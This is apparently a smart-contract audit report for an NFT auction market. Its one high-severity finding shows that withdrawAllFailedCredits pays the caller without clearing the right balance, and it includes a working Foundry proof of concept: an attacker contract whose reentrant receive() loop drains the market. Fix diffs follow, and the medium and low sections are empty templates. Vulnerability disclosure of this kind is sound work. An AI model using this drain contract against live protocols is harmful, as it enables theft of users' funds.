## HIGH

### [H-1] - Funds can be drain through `BidBeastsNFTMarket::withdrawAllFailedCredits` function.

**Description**: The `withdrawAllFailedCredits` is responsible for allowing an user to withdraw funds that fail to transfer over a bid. 

When any user call `placeBid` with a higher amount than previuos bidder, the `placeBid` logic will trigger the `_payout` internal function which will try to send the previous bidder amount back to the previous bidder, because a higher bid amount is in place.

If the `_payout` function fail to transfer the previous bid amount to the previous bidder, it will create a `failedTransferCredits[recipient]` mapping value with the failed amount.

This procedure can be exploited by placing bid with a malicious contract that can't receive funds, and once this malicious contract is no longer the higher bidder, will force the `_payout` function to fail in order to create a valid `failedTransferCredits` amount.

The issue comes from an incorrect value set on the `failedTransferCredits` mapping where the `msg.sender` is being reset, but not the `_reciver` address and also because the `msg.sender` is the one to recieve the failed funds from the `_receiver` mount.

This is the actual implementation of the `withdrawAllFailedCredits` function:

```solidity
    function withdrawAllFailedCredits(address _receiver) external {
        uint256 amount = failedTransferCredits[_receiver];
        require(amount > 0, "No credits to withdraw");

@>      failedTransferCredits[msg.sender] = 0;

        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdraw failed");
    }
```

**Impact**: High, all funds can be drained from the protocol if the conditions for this attack are in place, which are quite simple to achieve, by just placing a bid on any nft with enough attention for the auction so the next bidder either place a higher bid or wins the nft.

**Proof of Concept**: (Proof of Code)

1. In the `BidBeastsMkartePlaceTest.t.sol` unit test, place the rejector contract:

```solidity
// can place bid, but can't recive funds
// forcing the 'BidBeastsNFTMarket::_payout' function to triggers 'failedTransferCredits' mapping amount
contract Rejector {
    BidBeastsNFTMarket public immutable i_market;

    constructor(BidBeastsNFTMarket _market) {
        i_market = _market;
    }

    function placeBid(uint256 tokenId) external payable {
        i_market.placeBid{value: msg.value}(tokenId);
    }
}
```

2. In the `BidBeastsMkartePlaceTest.t.sol` unit test, place the malicious contract:

```solidity
// malicious contract that exploit the 'BidBeastsNFTMarket::withdrawAllFailedCredits' bug
contract WithdrawFailedCreditsAttack {
    BidBeastsNFTMarket public immutable i_market;
    Rejector public immutable i_rejector;
    address private immutable owner;

    error WithdrawFailedCreditsAttack__NoFailedCredits();
    error WithdrawFailedCreditsAttack__WithdrawFailed();

    constructor(BidBeastsNFTMarket _market) {
        i_market = _market;
        i_rejector = new Rejector(_market);
        owner = msg.sender;
    }

    // 1. place a bid as 'rejector' contract, which does not have a receive funtion
    // when the 'rejector' contract is no longer the highest bidder, it will
    // trigger the 'BidBeastsNFTMarket::_payout' which will fail the transfer
    // so the 'rejector' contract will have a 'failedTransferCredits' mapping amount
    function placeBid(uint256 tokenId) external payable {
        i_rejector.placeBid{value: msg.value}(tokenId);
    }

    // 2. drain funds by calling 'withdrawAllFailedCredits' with address(i_rejector)
    // only if the 'rejector' have a valid 'failedTransferCredits' mapping amount
    function attack() external {
        uint256 rejectorFailedBalance = i_market.failedTransferCredits(
            address(i_rejector)
        );
        if (rejectorFailedBalance == 0) {
            revert WithdrawFailedCreditsAttack__NoFailedCredits();
        }

        i_market.withdrawAllFailedCredits(address(i_rejector));
    }

    fallback() external payable {}

    receive() external payable {
        // 3. when first funds received by an 'attack', will loop until drain
        uint256 rejectorFailedBalance = i_market.failedTransferCredits(
            address(i_rejector)
        );
        if (address(i_market).balance >= rejectorFailedBalance) {
            i_market.withdrawAllFailedCredits(address(i_rejector));
        }
    }

    // simple function to allow withdraw of funds from contract to owner
    function withdraw() external {
        (bool success, ) = payable(owner).call{value: address(this).balance}(
            ""
        );
        if (!success) {
            revert WithdrawFailedCreditsAttack__WithdrawFailed();
        }
    }
}
```

3. In the `BidBeastsMkartePlaceTest.t.sol` unit test, place the following unit test:

```solidity
    // proof of code
    // demostrate how can we drain funds from protocol by the bug in the
    // 'BidBeastsNFTMarket::withdrawAllFailedCredits' function
    function test_reentrancy_withdrawAllFailedCredits() public {
        // setup context
        _mintNFT();
        _listNFT();
        uint256 firstBidAmount = 2 ether;
        uint256 secondBidAmount = 3 ether;
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.deal(attacker, STARTING_BALANCE);
        WithdrawFailedCreditsAttack sc_attack;
        sc_attack = new WithdrawFailedCreditsAttack(market);
        // 1. place first bid as attack contract
        sc_attack.placeBid{value: firstBidAmount}(TOKEN_ID);
        vm.stopPrank();
        BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(
            TOKEN_ID
        );
        assertEq(
            highestBid.bidder,
            address(sc_attack.i_rejector()),
            "Rejector should be the highest bidder at this point."
        );
        console.log("highestBid.bidder: ", highestBid.bidder);
        // 2. place second bid by bidder 1, higher than last bid
        vm.startPrank(BIDDER_1);
        market.placeBid{value: secondBidAmount}(TOKEN_ID);
        vm.stopPrank();
        // 3. highest bidder is now 'BIDDER_1', attack contract should be ready to start an attack
        //  3-A. Rejector should have failed balance
        uint256 rejectorFailedBalance = market.failedTransferCredits(
            address(sc_attack.i_rejector())
        );
        assertEq(
            rejectorFailedBalance,
            firstBidAmount,
            "Rejector should have a failed credits balance after bid from 'BIDDER_1'."
        );
        // 3-B. Start the attack
        vm.startPrank(attacker);
        sc_attack.attack();
        vm.stopPrank();
        console.log(
            "mapping failedTransferCredits[address(sc_attack.i_rejector())]: %e",
            rejectorFailedBalance
        );
        console.log("MARKET BALANCE after attack: %e", address(market).balance);
        console.log(
            "sc_attack balance after attack: %e",
            address(sc_attack).balance
        );
        assertGt(
            address(sc_attack).balance,
            firstBidAmount,
            "Attack contract should have funds higher than first bid, which means a successfull attack."
        );
    }
```

4. Run the unit test to demostrate the exploit.

```bash
forge test --mt test_reentrancy_withdrawAllFailedCredits -vv
```

At this point, the balance of the `WithdrawFailedCreditsAttack` contract will be increased after a successfull attack, demostrating the issue at the `withdrawAllFailedCredits` function.

**Recommended Mitigation**: There are two suggestions for the solution of this issue:

1. If at the `withdrawAllFailedCredits` function, would like to keep the logic to send the proper funds to any address that have a valid amount at `failedTransferCredits`, we can just hard code the logic to only send the funds to the `_receiver`. So anyone can call the function but only the `_receiver` will get the funds.

```diff
    function withdrawAllFailedCredits(address _receiver) external {
        uint256 amount = failedTransferCredits[_receiver];
        require(amount > 0, "No credits to withdraw");

-       failedTransferCredits[msg.sender] = 0;
+       failedTransferCredits[_receiver] = 0;

-       (bool success, ) = payable(msg.sender).call{value: amount}("");
+       (bool success, ) = payable(_receiver).call{value: amount}("");
        require(success, "Withdraw failed");
    }
```

2. Hard code the `withdrawAllFailedCredits` function so only the `msg.sender` with a valid  amount at `failedTransferCredits` can withdraw their funds.

```diff
-   function withdrawAllFailedCredits(address _receiver) external {
+   function withdrawAllFailedCredits() external {
-       uint256 amount = failedTransferCredits[_receiver];
+       uint256 amount = failedTransferCredits[msg.sender];
        require(amount > 0, "No credits to withdraw");

        failedTransferCredits[msg.sender] = 0;

        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdraw failed");
    }
```

## MEDIUM

### [M-1] - 

**Description**:

**Impact**:

**Proof of Concept**: (Proof of Code)

**Recommended Mitigation**: 

## LOW

### [L-1] - 

**Description**:

**Impact**:

**Proof of Concept**: (Proof of Code)

**Recommended Mitigation**: 